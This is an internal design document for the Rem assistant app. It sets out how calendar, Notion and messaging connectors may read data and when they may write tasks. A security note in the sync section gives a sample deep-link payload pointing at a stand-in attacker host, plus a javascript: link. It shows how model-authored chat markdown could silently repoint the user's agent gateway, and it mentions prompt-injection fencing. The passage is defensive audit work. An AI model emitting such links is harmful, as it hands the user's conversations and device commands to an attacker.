# Source taxonomy — what a connected system is allowed to do to Rem's data

Records product decisions in the same format: the decision, why, and what it rules out.

**Read this before adding a connector to the ingestion path, or before letting anything a connector
returns become a row.** The existing plan assumed every connected toolkit ingests the same way. It
doesn't, and the difference is not a detail — it decides whether connecting Google Calendar makes Rem
more useful or fills the user's own calendar with duplicates of meetings they already have.

**The short version.** Rem watches every connected source. What a source is allowed to *produce*
differs by kind: a signal may become a suggestion; a mirror may only become a **sentence**, and turns
into a row only when the user asks for it.

Last updated 2026-08-11.

---

## The correction this doc records

> "Some platforms do a job of conflicting so should be treated more like a mirror than an ingestion
> source. i.e Google Calendar may mean we need to create an event in this app if the event isn't
> here already (It could be because the users Google cal is connected to their Apple Cal) or maybe
> we don't and we just talk about it in prose based on user preference. Notion is a hybrid of tasks
> and notes and overlaps so we either mirror or refer to in prose and let user decide."
>
> — the founder, 2026-08-11

And the refinement that governs this document, from later the same day:

> "Rem watches all sources but is smart enough to know when something is either a duplication or of
> an app or model that conflicts with our system (i.e. you're tracking this in Notion or GCal but
> not here). It restricts items like that to prose and leaves it up to the user to ask for it to be
> added or synced rather than add it as a suggestion to be written into our own app."
>
> — the founder, 2026-08-11

**The second quote changes this document, it does not restate the first.** An earlier revision of
this file concluded that mirrors should not be ingested *at all* — that the right move was to refuse
the duplicate at connect time and tell the user Rem already had their calendar. That advice is now
removed, not softened. It was wrong in a specific, checkable way:

> the awareness needed to say *"you're tracking this in Notion but not here"* only exists if Rem
> looked.

A Rem that declines to read Google Calendar cannot produce that sentence. It has nothing to compare.
"Refuse at connect time" bought a guarantee against duplicates by giving up the one observation that
makes the feature worth having.

So the restriction moves from **what Rem may see** to **what Rem may write**:

| | this doc's earlier revision (withdrawn) | this model |
|---|---|---|
| read a mirror | no — refuse at connect | **yes, always** |
| write a row from a mirror | no | no — **unless the user asks** |
| tell the user about a mirrored item | only if it reached the device anyway | **yes, in prose** |
| who initiates a sync | nobody | **the user, every time** |

The rest of this document — the classifying test, the object-not-connector rule, and the four
arguments against cross-system identity matching — survives unchanged. What it now protects is the
write, which is the only place a duplicate can actually be born.

**Separately, the *pre-taxonomy* model — one union for every source — is still written into the
code**, and that is what both founder quotes are correcting. Doc 38 §4 pinned one `SignalSource`
union with `'calendar'` sitting next to `'whatsapp'`, and `suggestions.service.ts:51` still carries
it:

```ts
export type SuggestionSource = 'calendar' | 'overdue' | 'gmail' | 'whatsapp' | 'discord';
```

A calendar event and a WhatsApp message are not the same kind of thing, and treating them as one
type is what produces the duplicate.

**This is urgent, not theoretical.** Google Calendar is already connectable
(`composio.service.ts:93`) and the founder has Calendar and Discord connected now. The moment
anything points a general ingester at `googlecalendar`, every meeting that already reaches Rem
through the user's iPhone arrives a second time.

---

## The three kinds

| | the remote system holds | Rem's relationship | examples |
|---|---|---|---|
| **Signal** | objects Rem will never own or author | react | Gmail, Slack, Discord |
| **Mirror** | the *same kind* of object Rem holds | **watch; never write** | Google Calendar, Apple Calendar (device), Todoist, Asana |
| **Hybrid** | some of each | split, then ask | Notion, Linear |

Rem watches all three. The column says what Rem is allowed to *produce* from each, not whether it is
allowed to look.

---

## The classifying test

**The question is one line:**

> **Can Rem create this object?**

If Rem can create it, Rem can duplicate it. That is a **mirror**.
If Rem can only react to it — it has an author who is not Rem and never will be — that is a
**signal**.
If the connector returns both, that is a **hybrid**.

This is mechanical, not a judgment call, because "can Rem create it" is answerable from the node
command list. `calendar.add`, `reminders.add`, `tasks.create` are all registered handlers in
`NodeInvocationRouter.swift`; there is no command anywhere that makes Rem the author of an inbound
mail or DM. Calendar is a mirror by the same evidence that says Gmail is a signal.

**The backstop, when the first answer feels ambiguous:**

> **Does this object already reach Rem by a second route?**

If yes, it is a mirror *regardless of the first answer*. A second route is a duplicate factory, and
it does not matter how tidy the ingestion code is.

Google Calendar fails this instantly. `calendar.events` is an advertised node command
(`NodeInvocationRouter.swift`, handler at `CalendarGatewayService.swift:51-95`), and a user whose
Google account is added to iOS Settings → Calendar has their Google events on the device *already*.
Rem reads them today.

### Worked examples

| connector | can Rem create it? | second route? | kind |
|---|---|---|---|
| Gmail | no — Rem never authors mail the user receives | no | **signal** |
| Slack, Discord | no | no | **signal** |
| Google Calendar | **yes** (`calendar.add`) | **yes** (device EventKit) | **mirror** |
| Todoist, Asana | **yes** (`tasks.create`) | no | **mirror** |
| Notion | pages: **yes**; comments/mentions: no | no | **hybrid** |
| Linear | issues: **yes**; mentions/review requests: no | no | **hybrid** |

Note the two columns disagree for Todoist and agree for Google Calendar. Either column answering
"yes" is sufficient — they are separate ways to be a mirror, not a two-part test.

---

## Per kind: what the pipeline does, and what it must not do

### Signal — built, proven, unchanged

This is the path that already works end to end: poller → `channel_signals` → relevance judge →
suggestion. Nothing in this document changes it.

**Does:** poll a bounded window, write one `channel_signals` row per external event, judge relevance
at ingest, surface a suggestion the user accepts or dismisses.

**Must not:** create a task without the user accepting one. That is the approval rule in
our product decisions, and it is what keeps a signal source from becoming a writer.

### Mirror — watch it, describe it, never write it

**Does:** get read **live, at question time**, and described in prose. "Your calendar has a 3:00 PM
design review" is the whole feature. Reading is unconditional and is not the thing being restricted
— a mirror Rem never reads is a mirror Rem can never mention.

**Must not — every one of these is a way for a mirror to write something the user did not ask for:**

1. **Must not write `channel_signals` rows.** A calendar event is not "something happened"; it is a
   scheduled object with a lifetime, and the table is built for the other thing. Two concrete
   mismatches, not aesthetic ones:
   - **The window is strictly in the past.** The runner sets `windowEnd = now` and
     `windowStart = now − 24h` (`connector-signals.runner.ts:285-288`) and drops every item outside
     it (`:347`). A signal's `received_at` is when the event *happened*. A meeting next Tuesday has
     no such timestamp in that window — the thing that makes it worth knowing about is in the
     **future**. Calendar events cannot pass this check, and forcing them through means lying about
     `received_at`.
   - **There is no delete path.** `channel_signals` upserts on re-ingest
     (`suggestions.service.ts:395-405`, which correctly clears the relevance verdict when text
     changes), but nothing ever removes a row — 0 `DELETE FROM channel_signals` against 1 `INSERT`
     as an in-command control. A cancelled meeting's row outlives the meeting.
2. **Must not create backend `tasks` rows of `type='calendar_event'`.** Those already exist, they
   already feed the brief (`brief.service.ts:343`) and the "Prep for…" suggestion
   (`suggestions.service.ts:309`), and an ingester adding to them is adding to a table the user's
   own device also writes.
3. **Must not be added to `listDescriptors()`.** See the registry section — that function's return
   value currently *means* "sources the signal poller reads", and three consumers depend on it.
4. **Must not emit a `TaskSuggestion`.** This is the one the founder's wording names directly:
   *"rather than add it as a suggestion to be written into our own app."* A suggestion is not a
   softer form of prose — it is a **staged write with a one-tap trigger**. `SuggestionAction.kind`
   is `'createTask' | 'rescheduleTask'` (`suggestions.service.ts:35`), the row renders an accept
   `Button` (`SuggestedTaskRow.swift:36`), and accepting runs `performAccept`
   (`AgendaViewModel.swift:999`) which creates the task through the app's SwiftData + sync path.
   Between the card appearing and the row existing there is one tap and no decision. That is the
   affordance a mirror must not have.
   Concretely: **`SuggestionSource` (`suggestions.service.ts:51`) must never gain a mirror member.**
   And the rule is about the **affordance, not the type** — a markdown deep link in the brief prose
   (`[Add to Rem](remclaw://add-task?…)`) is a one-tap staged write that never touches
   `SuggestionSource` at all. It renders today, unmodified. See *"Why not a button on the prose
   line"* for why that route exists and why review, not the compiler, is what closes it.
5. **Must not deduplicate against other mirrors.** See "The identity question" below. This is the
   important one, and it is the one thing detection is explicitly *not* — comparing in order to
   write a sentence is allowed; comparing in order to merge is not.

**Promotion is the escape hatch, and it already exists.** When the user acts on a mirrored object it
becomes a real, owned, synced Rem object at that moment, keyed on the source system's id. Already
shipped for the device calendar, and — note the direction of travel — #875 deliberately **removed**
the explicit "Let Rem work this" opt-in card in favour of creating the backing lazily on the user's
first real interaction (`TaskEventViewModel.swift:134-141`, `ensureWorkBacking` at `:239`). The
product has already decided that the user's own action is the write trigger and that it does not
need a dedicated button. That precedent does most of the work in "How the user asks for a sync",
below.

### Hybrid — split it first, then ask about the half that overlaps

A hybrid is not a third mechanism. It is a source that emits **both** kinds, and the fix is to stop
treating the connector as the unit of classification. The unit is the **object**.

Notion, split:

| object | kind | why |
|---|---|---|
| a comment or `@`-mention aimed at the user | **signal** | someone else wrote it; Rem will never author one |
| a page or database row with an assignee and a due date | **mirror** | that is a task, and Rem holds tasks |

**Does:** ingest the signal half unconditionally. Apply the user's preference to the mirror half
only.

**Must not:** put the preference in front of the signal half. A colleague `@`-mentioning the user in
a doc is a person waiting on them under any setting — that is the first `UNIVERSAL_PRIORS` entry
(`signal-relevance.service.ts:412`), and it is not a preference question.

---

## The identity question, and my recommendation

**The question.** The same 3:00 PM design review can exist as a Google Calendar event, an Apple
Calendar event synced from Google that Rem already reads via `calendar.events`, and a Rem-native
`tasks` row the user typed. Can Rem tell they are one meeting?

### What identity Rem actually has

Verified, not assumed:

| copy | id Rem sees | where |
|---|---|---|
| device event (incl. Google-synced) | EventKit `eventIdentifier` | `CalendarGatewayService.swift:87` |
| Rem-native event the user typed | a Rem UUID, `calendar_event_id` **NULL** | `tasks.routes.ts:279-300` |
| Google Calendar via Composio | Google's event id | no descriptor exists yet |

`tasks.calendar_event_id TEXT` and its partial unique index on `(user_id, calendar_event_id)`
already exist (migration `024_add_calendar_event_backing.sql:12,17-18`). **That column holds the
EventKit `eventIdentifier` and nothing else.**

Three properties of that identifier decide the answer:

1. **It is device-local.** `eventIdentifier` names a row in *this device's* EventKit store. The same
   meeting on the user's Mac has a different one. `calendar.update` and `calendar.delete` resolve
   through `eventStore.event(withIdentifier:)`, so they already only work on the device that issued
   the id.
2. **It has no relationship to Google's id.** The two id spaces do not intersect. The existing
   unique index will not catch the duplicate, because the two rows genuinely have different keys.
3. **The one field that could bridge them is not read.** `EKEvent.calendarItemExternalIdentifier`
   is derived from the iCalendar UID and is the only EventKit field that could join an Apple copy
   to its Google original. Rem reads it **nowhere** — verified by grep across `RemClaw/`,
   `RemClawMac/` and `Shared/`, with `eventIdentifier` as an in-command control: 14 hits for the
   control, 0 for the target.

Nor does Rem know which *account* an event came from. `CalendarEventPayload` carries
`calendarName: event.calendar?.title` (`CalendarGatewayService.swift:93`) — a user-editable display
string like "Work". `EKSource` / `sourceType`, which would say CalDAV vs Exchange vs local, is not
surfaced.

And there is no mapping table. `tasks.calendar_event_id` is the **entire** surface for foreign ids
in the schema — no `external_id`, `remote_id`, `source_system` or `foreign_id` column exists in any
migration (0 hits against 5 for `calendar_event_id` as an in-command control).

### Could we build the join?

Partly, and that is the honest answer. Adding `calendarItemExternalIdentifier` to the payload is one
line, and for Google accounts synced over CalDAV it usually does carry through as the iCalUID. It
would work much of the time.

But "much of the time" is doing real work in that sentence. Apple does not guarantee that field is
unique — recurrence exceptions and the same invitation living in two calendars can share one value.
Whether Composio's Google Calendar action even exposes `iCalUID` is unverified; nobody has captured
a payload from it — and the registry's own `parseGmailItem` docblock
(`connector-signals.registry.ts:262-286`) says the same thing about Gmail's action in its own words:
*"What it DOES put on the wire is still unconfirmed — nobody has captured a payload"* (`:269`). That
docblock also records what assuming cost: a wrong field-name claim meant every real message was
dropped — `fetched=2 dropped=2 ingested=0`, exit 0, zero rows, **twice** (`:279`). Everything left
over after the id join fails falls back to fuzzy title-and-time matching, which is a heuristic
wearing a database's clothes.

### Rem already contains one fuzzy matcher. Look at what it does.

This is the part that should settle the design question empirically rather than by argument.
`RemCalendarService.swift:337-352` matches a Rem task against a device event by title and time —
the exact mechanism a mirror deduplicator would need, already written, already shipped, called from
`AgendaViewModel.swift:547` and `InboxViewModel.swift:54`:

```swift
let searchStart = Calendar.current.date(byAdding: .day, value: -1, to: startDate) ?? startDate
let searchEnd   = Calendar.current.date(byAdding: .day, value:  1, to: startDate) ?? startDate
// …
if let match = events.first(where: { $0.title == title }) { return match.eventIdentifier }
if let match = events.first(where: { $0.title?.lowercased() == title.lowercased() }) { return match.eventIdentifier }
```

Its caller writes the returned identifier into `task.calendarEventID` — so it does not merely
*guess*, it **persists the guess as identity**.

Three defects are visible in fifteen lines, and they are not sloppiness — they are what this problem
does to anyone who tries:

- the window is **±1 day**, not ±1 minute, so a daily standup happily matches yesterday's
  occurrence;
- it takes `.first` with **no scoring**, so two same-titled events in a 48-hour window resolve
  **arbitrarily** — whichever EventKit happens to return first;
- there is **no ambiguity handling at all**. Nothing detects that there were two candidates. The
  wrong answer is indistinguishable from the right one downstream.

This is the *easy* version of the problem: one device, one store, an id space Rem controls, and a
title Rem itself wrote. Cross-system mirror dedup is strictly harder — different id spaces,
provider-rewritten titles, timezone-shifted starts — and would be built by the same people under
the same pressure. Generalizing this is not a plan; it is the same fifteen lines with a larger blast
radius.

The repo's only other similarity metric is a Jaccard scorer in `memory-extraction.service.ts:178-203`
(`DEFAULT_DEDUP_THRESHOLD = 0.6`) — in the memory subsystem the product decisions retired and schedule for
deletion. The only two fuzzy matchers we have are one that resolves ties arbitrarily and one in code
we are removing.

### The argument that actually settles it

**Even a perfect join buys almost nothing.**

If the user's Google Calendar syncs to their iPhone, Rem *already sees every one of those events*
through `calendar.events`. The device is already the union. Ingesting Google Calendar adds new
information only for events the user deliberately chose not to put on their phone — a narrow set,
and one the user can fix in ten seconds in iOS Settings.

So the dedup engine's entire job would be to clean up a mess that only exists because we created it.

**That narrow set is not worthless, though — it is the whole point of the prose.** The events the
device does *not* carry are exactly the ones worth a sentence: *"your Google Calendar has a 3:00 PM
design review that isn't on this phone."* Rem reads the mirror, notices the gap, and says so. That
costs a comparison and a sentence. It does not cost an entity-resolution table, because naming the
gap never requires naming *which* Rem object the item corresponds to — only that none does. The next
section is about exactly that distinction.

**And the failure costs are wildly asymmetric.**

| approach | what it costs when it is wrong |
|---|---|
| dedup engine | a **wrongly merged** meeting — one event silently hides another, in the artifact the user trusts most. Or a duplicate, which is the thing it was built to prevent. |
| prose | one redundant sentence. "Your Google Calendar also shows the 3:00 PM design review." The user reads it and moves on. |

A merge that is 95% right is not 95% of a good feature. The 5% is a missed meeting, discovered
afterwards, caused by the assistant. Nothing in the prose path can produce that class of failure.

### Decision

**Rem watches every connected source. Mirrors are read live, described in prose, and never write a
row unless the user asks.**

Three rules, in the order they apply:

1. **Rem reads mirrors.** Unconditionally, live, at question time. Connecting Google Calendar or
   Notion is a real, useful thing to do, and Rem does not decline to look.
2. **A mirrored object may reach the user only as prose.** Not a `channel_signals` row, not a
   `tasks` row, not a `TaskSuggestion`. A sentence.
3. **Sync is user-initiated, every time.** Rem may say *"you're tracking this in Notion but not
   here."* Only the user turns that into a row.

**Rem still does not deduplicate objects across systems.** That part of the earlier decision is
unchanged and every argument above still holds. What changed is where the restriction sits: on the
write, not on the read.

**Explicitly reversed: the old "refuse the duplicate at connect time" advice is withdrawn.** An
earlier revision recommended that connecting a mirror Rem could already reach should be met with
"Rem already has this" instead of a second stream, and that Google Calendar should not be ingested
at all while the device node is connected. Do not reinstate it. It prevented duplicates by
preventing observation, and observation is the feature. If a future reader finds that reasoning
persuasive, the counter-argument is one line: *a Rem that refused to read Google Calendar could
never have told you an event was missing from your phone.*

**What this rules out.** An entity-resolution table. A cross-system id map. Title-and-time fuzzy
matching *used to merge*. Any "canonical event" concept. Any UI for correcting a bad merge — which
only needs to exist if something is merging. Any mirror-sourced suggestion card. Any code path where
reading a mirror can, by itself, cause a write.

**What it does *not* rule out, to be precise:** `findEventID` keeps working as it does today. This
decision says do not **generalize** it across systems; it does not retroactively delete an existing
device-local behaviour. Its `.first`-wins ambiguity is a real defect and worth its own issue — but
that is a bug in shipped code, not a question this taxonomy decides.

**Prior art existed and has been deleted.** `_reference/OpenClawTestBed/docs/task-sync-mechanism.md`
specified a fuller version of exactly this — id match, then fuzzy title + same-day fallback, then
merge by rewriting the local id. That whole tree was removed from `staging` in
`29e251ec` ("chore: remove proprietary `_reference/` tree before open-sourcing", #1324) because it
was a third party's code and not ours to relicense; `git ls-tree origin/staging -- _reference/`
returns nothing today. Recorded here so nobody rediscovers it in history, assumes it is ours, and
mines a merge algorithm out of it.

**What would change it.** A user with calendars that genuinely do not reach the device, asking for
them, more than once — and asking for them to be *synced*, not merely mentioned. Under this model
the mention is already covered, which is precisely why the gap will now announce itself in the
user's own words rather than as silence.

---

## The crux: detection is not identity-matching

This is the load-bearing distinction, and it is why the model above is safe where automatic merging
was not. Everything in "The identity question" is an argument against a **join**. The founder's
model never asks for one.

| | identity-matching (rejected) | detection (this model) |
|---|---|---|
| question asked | *which Rem object is this the same as?* | *does any Rem object correspond to this?* |
| answer type | a row id | a boolean |
| answer when ambiguous | must still pick one | may decline to answer |
| what happens to the answer | **persisted as identity** | **rendered into a sentence, then discarded** |
| cost of being wrong | a silently merged or hidden object | a wrong sentence |
| can it be re-derived next tick? | no — the write is durable | yes — nothing was stored |

`findEventID` is the rejected column, and its three defects (`RemCalendarService.swift:337-352`)
follow from that column, not from carelessness. A function that must return *an id* cannot say "I'm
not sure", so it takes `.first`. A caller that must persist that id turns a guess into a fact. Both
pressures disappear when the return type is `Bool`.

**Detection is allowed to be fuzzy precisely because its output is a sentence rather than a database
write.** A fuzzy sentence is a sentence that is sometimes slightly redundant. A fuzzy write is a
meeting the user never sees again. The tolerance for error is set by what the output can damage, and
prose can damage nothing but its own credibility — recoverably, in one line, in front of the user.

**We already ship this exact primitive, and it is not a matcher.** The prep-task suggester asks the
same question in SQL (`suggestions.service.ts:314-318`):

```sql
AND NOT EXISTS (
  SELECT 1 FROM tasks p
   WHERE p.user_id = $1 AND p.type = 'task'
     AND p.title = 'Prep for ' || e.title
)
```

That is an existence predicate — user-scoped, evaluated fresh on every read, persisting nothing, and
returning no row id. It cannot resolve ambiguously because it never resolves at all. Its own comment
(`:300-303`) calls it "the durable dedup" and explains the property that matters here: it holds
*without* the client's dismiss landing, because nothing about it depends on remembering a previous
answer. **This is the shape to mirror** (CLAUDE.md principle 1 — the pattern was already in our own
repo), not `findEventID`.

---

## Where the prose appears

No new UI. The surface already exists, is already the canonical prose artifact, and already carries
exactly this kind of sentence.

**The Daily Brief prose is the surface.** It is authored by the user's own gateway agent in a fresh
per-run context (`brief-authoring.service.ts`), cached in `daily_briefs`, and rendered in two
places that share one string:

| surface | file | what it shows |
|---|---|---|
| Agenda card | `DailyBriefCard.swift:44-50` via `DailyBriefAgendaPresentation.prose(for:)` | the lead `summary` line |
| orchestrator chat | injected with `chat.inject` into `rem-orchestrator` (`gateway-agent.service.ts:436-441`), rendered by `AssistantMarkdownView` | the full `markdown` |

A "you're tracking this in Notion but not here" line is a sentence the authoring turn writes into
that markdown. It needs no component, no card, no badge, and no schema.

**Do not use the brief detail sheet.** `BriefDetailView.swift` still renders
`brief.displayedBriefMarkdown`, but it is dead code on `staging` — the only occurrence of
`BriefDetailView` in the tree is its own declaration (`grep -rn BriefDetailView --include='*.swift'`
→ 1 hit, its `struct` line; `AgendaView` as an in-command control → 10 hits in `ContentView.swift`
alone). `AgendaView.swift:56-59` calls it "the retired Daily Brief detail sheet" while explaining
why the brief tap routes to chat instead. Building on it would be building on a surface no user
reaches. It is item 7 of 15 in the dead-code removal in **#1338**, where its deadness was confirmed
by deleting it and building both schemes — a stronger signal than the grep above, and the one to
cite if this note outlives the file.

**How the item gets into the prose.** The authoring turn already reasons over a
backend-collected snapshot (`renderBriefInputPrompt`, `brief-input.service.ts:192-203`) that quotes
provider data as inert, explicitly non-instructional text. A mirror block is the same shape: quoted
items, plus the boolean from the detection predicate. That prompt already carries an untrusted-data
fence, which a mirror block needs for the same reason Gmail does — a Notion page title is
attacker-influenceable text.

---

## How the user asks for a sync

**Recommendation: a chat message. Do not put an affordance on the prose.**

The doorway is already built and already lands in the right place:

- The brief card's tap handler opens the brief's own conversation —
  `onOpenBriefChat(viewModel.brief?.briefSessionKey ?? "rem-orchestrator")`
  (`AgendaView.swift:60-63`), routed at `ContentView.swift:1071-1080`.
- That is the same durable `rem-orchestrator` session the prose was injected into, and it has a live
  composer. The user reads the sentence and replies to it in place.
- So "ask for it to be added or synced" costs zero new UI: read line, tap card, type *"yes, add
  that one."*

**Why not a button on the prose line.**

First, the thing an earlier draft of this doc got wrong, corrected here because the wrong version was
actively dangerous. That draft said there was "nothing to attach a button to" — 0 hits for `Button`,
0 for `onTapGesture` in `AssistantMarkdownRenderer.swift`. Both counts are accurate and the
conclusion drawn from them was false. **A one-tap "Add to Rem" is available today, with no new
component, no new view, and no schema change:**

- Paragraphs render as `Text(LocalizedStringKey(text))` (`AssistantMarkdownRenderer.swift:328`).
  SwiftUI parses markdown in a `LocalizedStringKey`, and `[label](url)` becomes a **tappable link**
  dispatched through the environment's `openURL`. The file's own docblock already says so — *"inline
  styling (bold/links) inside a cell still works via `LocalizedStringKey`"* (`:367`).
- The two `allowsHitTesting(false)` calls in the file (`:278`, `:292`) are on the edge-fade gradient
  overlays, not on the text. Text hit-testing is live.
- The app registers the `remclaw://` scheme (`RemClaw/Info.plist:18-20`) and routes `onOpenURL` into
  `handleOrDeferDeepLinkUntilAuthRestores` (`RemClawApp.swift:440-445`).

So the authoring turn writing `[Add to Rem](remclaw://add-task?title=…&date=…)` into the brief
markdown would produce a working one-tap accept, and every grep for `Button` in the view layer would
still return zero. **Nothing technical prevents this. That is exactly why it has to be a rule.** A
doc that claims a restriction is enforced by a technical limit stops being believed the moment
someone discovers the limit isn't there — and then nothing is stopping them.

The two reasons it must not be built, in ascending order of importance:

1. **It re-introduces the machine-readable payload through the URL.** A tappable "Add to Rem" needs
   the authoring turn to emit a structured, addressable action — a title, a date, an idempotency
   key. Putting those in a query string rather than a JSON field changes the encoding and nothing
   else. `remclaw://add-task?title=…&date=…` **is** a `TaskSuggestion`, serialized differently.
2. **It would be a suggestion in everything but name, which is the thing the founder ruled out.** A
   one-tap accept next to a mirrored item is exactly the affordance *Mirror → Must not #4* forbids.
   Renaming the button — or dissolving it into a link — does not change what it does to the tasks
   table.

**This is the specific thing to watch for in review.** A deep-link accept is the cheapest possible
way to violate *Must not #4*, it is one line of markdown, it touches no Swift file, and it is
invisible to every structural check we have. The rule has to be enforced in the **authoring prompt**
and in review of that prompt, because no view-layer test will catch it.

> **⚠️ The same mechanism reaches a much worse sink, and that is a security question, not a product
> one.** Tracked separately — this note exists so nobody reads the section above and concludes the
> only stake is taxonomy hygiene.
>
> `remclaw://connect?url=…&token=…` repoints the user's gateway. `RemClawApp.swift:714-720` reads
> both query items and calls `gateway.configure(...)`, which persists them, sets `isConfigured =
> true`, and calls `connectIfConfigured()` immediately (`GatewaySessionManager.swift:1084-1090`).
> There is **no confirmation, no scheme check, and no host allowlist** — `isValidGatewayURL`,
> `validateGateway`, and any `allowedHosts` are 0 hits tree-wide; `.fly.dev` appears only as provider
> *classification* (`GatewaySessionManager.swift:1025`, `:1045`), never as a gate. The gateway is the
> agent backend and holds the node command allowlist, so repointing it is not a staged write — it is
> conversation content out and node commands in.
>
> **Exposure boundary, which is narrower and broader than it first looks:**
> - **The Agenda brief card is not exposed.** `DailyBriefCard.swift:45` is `Text(summary)` where
>   `summary` is a `String` — that is the verbatim `StringProtocol` initializer, which does **not**
>   parse markdown. No link renders there.
> - **The chat surface is, and for every assistant turn, not just the brief.**
>   `AssistantMarkdownView` is what parses markdown, and it renders all assistant message text
>   (`SharedRemChatView.swift:3355`, `:4861`). There is **no `OpenURLAction` override anywhere in the
>   chat hierarchy** — 0 hits. So the vector is any model output reaching chat, which is a wider
>   surface than the brief's Gmail snapshot.
>
> **Measured, not read — the parser does not filter custom schemes.** The prior version of this note
> said the whole chain was source-read only. One hop has since been executed. Running Foundation's
> markdown parser with the inline-only options SwiftUI uses for `LocalizedStringKey`:
>
> ```
> [Add](https://example.com/x?a=1)                             LINK  scheme=https    (control)
> [Add to Rem](remclaw://add-task?title=T&date=D)              LINK  scheme=remclaw
> [Connect](remclaw://connect?url=wss://evil.example&token=abc) LINK  scheme=remclaw
>     -> host=connect   query url=wss://evil.example   query token=abc
> [Mail](mailto:a@b.com)                                        LINK  scheme=mailto
> [Call](tel:+15551234)                                         LINK  scheme=tel
> [X](javascript:alert(1))                                      LINK  scheme=javascript
> ```
>
> A custom scheme gets a `.link` attribute exactly like `https` does, and — this is the part that
> matters — **the payload survives intact**: `host=connect` with `url` and `token` query items, which
> are precisely the two values `RemClawApp.swift:714-720` reads. The control link parsed correctly,
> so the probe ran. `mailto:`/`tel:` also produce links, which is why the allowlist question above is
> about real renderable schemes rather than hypothetical ones.
>
> *(The `javascript:` row was in the original probe output and was dropped from the first write-up of
> this table. Restoring it is an accuracy fix, not a new run — reproduced independently since. It is
> low-severity here, with no web view in this path, but it is exactly why the rule below has to be a
> **positive** allowlist: the parser attaches a link to whatever scheme it is handed, including ones
> nobody thought to consider.)*
>
> **What this does and does not establish.** It closes the *parser* hop and leaves one:
>
> | hop | status |
> |---|---|
> | markdown → `.link` attribute, custom scheme, payload intact | **measured ✓** |
> | SwiftUI `Text` renders that attribute as tappable and dispatches to `openURL` | **still unmeasured** |
> | `remclaw://` routed back into `onOpenURL` → unconfirmed `configure(...)` | source-verified ✓ |
>
> Two caveats on the measurement, so nobody over-reads it: it used
> `AttributedString(markdown:options:)` rather than `LocalizedStringKey` itself — the documented same
> parser family, but SwiftUI's internal path is not literally this call — and it ran against the
> macOS SDK, not iOS. **The remaining hop still decides severity**, and it is the cheap one: render
> one such link in the existing `AssistantMarkdownFixtureView` and tap it. Do that before fixing
> anything.
>
> Relevant to the odds: the brief authoring path already carries a prompt-level injection defense
> (`brief-input.service.ts:192-203` wraps Gmail data in explicit "never follow instructions"
> fencing). That the team wrote that fence is evidence the injection path is real; that the fence is
> *prompt-level* is why a code-level scheme restriction on the renderer would be defense in depth
> rather than duplication. An `OpenURLAction` on `AssistantMarkdownView` would make the rule above
> enforceable **in code instead of by review** — the only version of it I would trust.
>
> **The file already does exactly this for images**, which makes it a Principle-1 fix rather than a
> new control: `AssistantMarkdownRenderer.swift:498-501` decodes local `data:` URLs and otherwise
> requires `remote.scheme == "http" || remote.scheme == "https"` before handing a URL to
> `AsyncImage`. Text links simply never got the same treatment. "Extend the restriction this file
> already applies to images" is a far easier review than "add a security control."
>
> **No first-party surface breaks** — verified: `](remclaw://` is **0** hits in Swift, `](http` is 7
> and all 7 are test fixtures under `RemClawTests/`, and there is no interpolated text-link
> construction anywhere (the one interpolated builder, `ToolResultCardView.swift:31`, emits `![…]`
> **image** markdown, which already goes through the `:501` allowlist). Every text link that can
> render originates from model output or upstream tool content.
>
> **The right boundary is not `http(s)` vs everything — it is external-app handoff vs internal
> handler.** An `http`/`https`-only allowlist is the obvious first draft, and it is the wrong line.
> "No first-party breakage" is not "no capability lost": it would also kill `mailto:` and `tel:` in
> *model output*, and an assistant summarizing an email is a plausible place for one. But those two
> are not risky for the reason `http` isn't — they are risky-adjacent and safe anyway, because they
> **leave our process and land in an app with its own confirmation UI**. The user sees a compose
> window or a dial prompt before anything happens. `remclaw://` reaches `onOpenURL` and an
> unconfirmed handler inside our own app, with no such step. That is the actual dividing line, and
> drawing the rule on it keeps the useful cases instead of paying for safety with them:
>
> **Permit exactly `http`, `https`, `mailto`, `tel`. Reject every other scheme, including unknown
> ones.**
>
> **It has to be phrased positively, and an earlier draft of this line got that wrong.** "Block
> app-internal schemes" describes the same intent and implements as a denylist, which cannot be made
> exhaustive: it would have to enumerate every scheme this app or any other ever registers, and stay
> correct as they change. The `javascript:` row in the measurement above is the demonstration — the
> parser hands back a link for a scheme nobody on this thread thought to consider until it showed up
> in probe output. A positive allowlist fails closed on exactly that case; a denylist fails open on
> every case no one enumerated.
>
> This costs nothing measurable. The only first-party `mailto:` in the app
> (`SharedAboutView.swift:217`, the feedback link) is a `URL` built outside the renderer and is
> unaffected either way — so the entire practical question is what *model-authored* prose may offer,
> and the answer above keeps every benign case while closing the one that matters. Stated as a priced
> rule rather than a free win so nobody re-opens it ad hoc in QA.

**The precedent is #875, and it points the same way.** That change deleted the explicit "Let Rem work
this" opt-in card and made the backing task get created lazily on the user's first real interaction
(`ensureWorkBacking`, `TaskEventViewModel.swift:239-261`). The product has already decided once that
a user's ordinary action is a better write trigger than a dedicated button. Recommending a chat reply
here is applying that decision, not inventing one.

**The cost, stated honestly.** A chat reply is higher-friction than a tap, and it is *supposed* to
be. The friction is the consent. It is also the failure mode: the user may not realise a reply is
possible. Mitigation is copy, not chrome — the authored sentence should end in the ask ("want me to
add it?"), which is one more clause in a string the agent is already writing.

---

## What the detection signal is, and what it costs when wrong

### The signal

For each item `M` read live from a mirror, one boolean:

```
hasRemCounterpart(M) := ∃ t ∈ RemObjects(user, window) . corresponds(normalize(t.title),
                                                                     normalize(M.title))
```

- `normalize` = trim, casefold, collapse internal whitespace. Nothing cleverer; no stemming, no
  token overlap, no edit distance.
- `corresponds(a, b)` = `a == b` **or** either string contains the other. See the threshold section
  for why containment belongs here and only here.
- `RemObjects` = the user's own `tasks` rows (both `type='task'` and `type='calendar_event'`),
  scoped by `user_id`.
- `window` = for a dated item, the user's local day containing `M.start`. For an undated item (a
  Notion page with an assignee and no due date), no window — title only.
- `hasRemCounterpart(M) == false` is the condition that earns the sentence.

Note what the signature does *not* contain: no return of `t`, no score, no tie-break. `∃` is the
entire contract, and it is what keeps this from being a join.

It is deliberately the `NOT EXISTS` shape from `suggestions.service.ts:314-318`, not a scored match.
It returns no id, is recomputed on every brief cycle, and is never written down.

**The window is the one number worth arguing about, and it should be a day, not `findEventID`'s ±1
day.** ±1 day spans two occurrences of a daily standup, which is how that function matches
yesterday's meeting. The user's local day is both tighter and the unit the brief is already built
around (`resolveUserTimezone`, `brief-authoring.service.ts`).

### The threshold, and which way it leans

**The predicate is one-sided on purpose: it is permissive about finding a counterpart and strict
about announcing there isn't one.** Anything that plausibly matches suppresses the sentence. Rem
speaks only when nothing does.

That asymmetry is the whole reason this can be fuzzy where a merge could not. A permissive matcher
